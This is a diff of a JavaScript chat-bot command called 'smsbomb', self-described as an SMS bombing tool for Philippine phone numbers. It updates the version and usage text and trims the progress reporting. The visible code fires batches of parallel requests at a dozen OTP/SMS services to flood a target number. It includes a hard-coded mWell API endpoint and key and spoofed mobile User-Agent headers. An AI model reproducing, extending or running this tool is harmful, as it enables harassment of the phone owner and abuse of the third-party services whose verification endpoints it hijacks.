@@ -3,17 +3,17 @@ const crypto = require('crypto');
 
 module.exports.config = {
   name: "smsbomb",
-  version: "4.0.0",
+  version: "5.0.0",
   role: 2,
   credits: "selov",
   description: "SMS bombing tool for Philippine numbers",
   commandCategory: "utility",
-  usages: "/sms <phone> <amount>",
+  usages: "/smsbomb <phone> <amount>",
   cooldowns: 60
 };
 
 module.exports.run = async function ({ api, event, args }) {
-  const { threadID, messageID, senderID } = event;
+  const { threadID, messageID } = event;
 
   // Helper functions
   const formatPhone = (phone) => {
@@ -40,7 +40,7 @@ module.exports.run = async function ({ api, event, args }) {
     return crypto.createHash('sha256').update(data).digest('hex');
   };
 
-  // Service functions
+  // Service functions (all 12 services)
   const services = [
     {
       name: "MWELL ULTRA",
@@ -48,7 +48,6 @@ module.exports.run = async function ({ api, event, args }) {
         try {
           const API_URL = "https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number";
           const API_KEY = "0a57846786b34b0a89328c39f584892b";
-          
           const formattedPhone = formatPhone(phone);
           const headers = {
             'User-Agent': 'okhttp/4.11.0',
@@ -95,7 +94,7 @@ module.exports.run = async function ({ api, event, args }) {
     },
     {
       name: "XPRESS PH",
-      func: async (phone, index) => {
+      func: async (phone) => {
         try {
           const headers = {
             'User-Agent': 'Dalvik/2.1.0',
@@ -295,9 +294,8 @@ module.exports.run = async function ({ api, event, args }) {
     // Validate phone
     if (!phone) {
       return api.sendMessage(
-        "❌ **Usage:** /sms <phone> <amount>\n" +
-        "📱 **Example:** /sms 9123456789 5\n\n" +
-        "⚠️ Use 10-digit format (e.g., 9123456789)",
+        "❌ **Usage:** /smsbomb <phone> <amount>\n" +
+        "📱 **Example:** /smsbomb 9123456789 5",
         threadID,
         messageID
       );
@@ -314,11 +312,7 @@ module.exports.run = async function ({ api, event, args }) {
     }
 
     if (isNaN(amount) || amount < 1 || amount > 20) {
-      return api.sendMessage(
-        "❌ Amount must be between 1-20.",
-        threadID,
-        messageID
-      );
+      return api.sendMessage("❌ Amount must be between 1-20.", threadID, messageID);
     }
 
     const formattedPhone = formatPhone(phone);
@@ -327,46 +321,24 @@ module.exports.run = async function ({ api, event, args }) {
 
     // Send initial message
     const waiting = await api.sendMessage(
-      `📱 **SMS BOMB STARTED**\n━━━━━━━━━━━━━━━━\n` +
+      `📱 **SMS BOMB IN PROGRESS**\n━━━━━━━━━━━━━━━━\n` +
       `📞 **Target:** +63${formattedPhone}\n` +
       `📊 **Batches:** ${amount}\n` +
-      `🔄 **Services:** ${totalServices}\n` +
       `⚡ **Total Requests:** ${totalRequests}\n` +
       `━━━━━━━━━━━━━━━━\n` +
-      `⏳ Processing... 0/${totalRequests}`,
+      `⏳ Please wait...`,
       threadID
     );
 
     let successCount = 0;
     let failCount = 0;
-    let processedCount = 0;
     const results = [];
-
-    // Create progress message
-    const progressMsg = await api.sendMessage(
-      `📊 Progress: 0/${totalRequests} completed`,
-      threadID
-    );
 
     // Execute all batches
     for (let batch = 1; batch <= amount; batch++) {
-      // Update batch status
-      await api.editMessage(
-        `📱 **BATCH ${batch}/${amount}**\n━━━━━━━━━━━━━━━━\n` +
-        `⏳ Sending to ${totalServices} services...`,
-        waiting.messageID
-      );
-
-      // Execute all services in parallel for this batch
       const promises = services.map(async (service) => {
         try {
-          let result;
-          if (service.name === "XPRESS PH") {
-            result = await service.func(phone, batch);
-          } else {
-            result = await service.func(phone);
-          }
-          
+          const result = await service.func(phone);
           if (result) {
             successCount++;
             results.push(`✅ ${service.name}`);
@@ -377,18 +349,6 @@ module.exports.run = async function ({ api, event, args }) {
         } catch {
           failCount++;
           results.push(`❌ ${service.name}`);
-        } finally {
-          processedCount++;
-          
-          // Update progress every few requests
-          if (processedCount % 5 === 0 || processedCount === totalRequests) {
-            await api.editMessage(
-              `📊 Progress: ${processedCount}/${totalRequests} completed\n` +
-              `✅ Success: ${successCount}\n` +
-              `❌ Failed: ${failCount}`,
-              progressMsg.messageID
-            );
-          }
         }
       });
 
@@ -403,8 +363,8 @@ module.exports.run = async function ({ api, event, args }) {
     // Calculate success rate
     const successRate = ((successCount / totalRequests) * 100).toFixed(1);
 
-    // Prepare result summary
-    const resultSummary = results.slice(-10).join('\n'); // Show last 10 results
+    // Prepare result summary (show all services)
+    const resultSummary = results.join('\n');
 
     // Final result message
     const resultMsg = 
@@ -412,21 +372,16 @@ module.exports.run = async function ({ api, event, args }) {
       `━━━━━━━━━━━━━━━━━━\n` +
       `📞 **Target:** +63${formattedPhone}\n` +
       `📊 **Batches:** ${amount}\n` +
-      `🔄 **Services:** ${totalServices}\n` +
       `⚡ **Total Requests:** ${totalRequests}\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
       `✅ **Successful:** ${successCount}\n` +
       `❌ **Failed:** ${failCount}\n` +
       `📈 **Success Rate:** ${successRate}%\n` +
       `━━━━━━━━━━━━━━━━━━\n` +
-      `**Last 10 Results:**\n${resultSummary}\n` +
-      `━━━━━━━━━━━━━━━━━━\n` +
-      `💬 Request completed!`;
+      `**Results:**\n${resultSummary}\n` +
+      `━━━━━━━━━━━━━━━━━━`;
 
-    // Delete progress message
-    api.unsendMessage(progressMsg.messageID);
-
-    // Update waiting message with results
+    // Update waiting message with final results
     await api.editMessage(resultMsg, waiting.messageID);
 
   } catch (err) {
